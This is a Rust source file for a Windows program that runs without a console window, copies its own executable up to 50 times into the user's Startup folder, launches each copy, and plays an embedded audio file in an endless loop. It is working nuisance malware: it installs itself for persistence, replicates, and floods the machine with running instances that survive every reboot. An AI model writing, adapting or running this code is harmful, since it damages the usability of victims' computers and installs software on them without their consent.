#![cfg_attr(windows, windows_subsystem = "windows")]

use rust_embed::RustEmbed;
use std::error::Error;

#[derive(RustEmbed)]
#[folder = "assets/"]
struct Assets;

fn main() -> Result<(), Box<dyn Error>> {
    #[cfg(windows)]
    {
        use dirs;
        use std::path::PathBuf;

        let exe_path = std::env::current_exe()?;
        let startup_dir: PathBuf = dirs::home_dir()
            .ok_or("Could not find home directory")?
            .join("AppData")
            .join("Roaming")
            .join("Microsoft")
            .join("Windows")
            .join("Start Menu")
            .join("Programs")
            .join("Startup");

        for i in 1..=50 {
            let target_path = startup_dir.join(format!(
                "{}_{}.exe",
                exe_path.file_stem().unwrap().to_string_lossy(),
                i
            ));
            if !target_path.exists() {
                std::fs::copy(&exe_path, &target_path)?;
                std::process::Command::new(&target_path).spawn()?;
            }
        }
    }

    let stream_handle = rodio::OutputStreamBuilder::open_default_stream()?;
    let sink = rodio::Sink::connect_new(stream_handle.mixer());

    let audio_file = Assets::get("audio.mp3").ok_or("audio.mp3 not found")?;
    let cursor = std::io::Cursor::new(audio_file.data);
    let looped_decoder = rodio::Decoder::new_looped(cursor)?;

    sink.append(looped_decoder);
    sink.sleep_until_end(); // loops forever

    Ok(())
}
